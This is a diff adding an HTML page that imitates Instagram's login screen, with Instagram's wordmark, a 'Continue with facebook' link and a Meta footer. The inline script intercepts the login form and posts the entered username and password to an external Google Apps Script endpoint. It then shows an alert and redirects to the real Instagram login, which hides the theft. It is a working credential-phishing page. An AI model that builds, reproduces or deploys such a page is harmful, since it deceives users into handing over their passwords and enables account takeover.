@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/favicon.ico" />
+    <title>login-instagram</title>
+</head>
+<body>
+    <div class="container">
+        <!-- content -->
+        <div class="content">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="instagram">
+                <img src="img/facebook-icon.png" alt="facebook" class="image">
+                <a href="blank" target="blank">Continue with facebook</a>
+                <h3>OR</h3>
+            </div>
+            <!-- input -->
+            <div class="ipt">
+                <form name="login">
+                <input type="text" placeholder="Pone number, username, or email" name="username"> 
+                <input type="password" placeholder="Password" name="password">
+                <a href="blank" target="blank">Forgot Password?</a>
+                <button type="submit">Login</button> 
+            </form>
+        </div>
+        <!-- p -->
+        <p>Don't have an account? <a href="blank" target="blank">Create account</a></p>
+        <!-- footer -->
+        <div class="footer">
+            <p>from</p>
+            <img src="img/meta.png">
+            <h2>Meta</h2>
+        </div>
+
+    </div>
+</div>
+
+    <!-- javaScript -->
+
+    <script>  
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyD579IqNdyNByFb5Li-qM2a13EhqsMiCt2V4OiPHvD2PDLRk-YqQFI-76Dkc3CMPIx/exec'
+  const form = document.forms['login']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+        console.log('Success!', response)
+        alert('pesan anda, kami proses')
+        window.open("https://www.instagram.com/accounts/login/")
+    })
+      .catch(error => console.error('Error!', error.message))
+  })
+    </script>
+</body>
+</html>
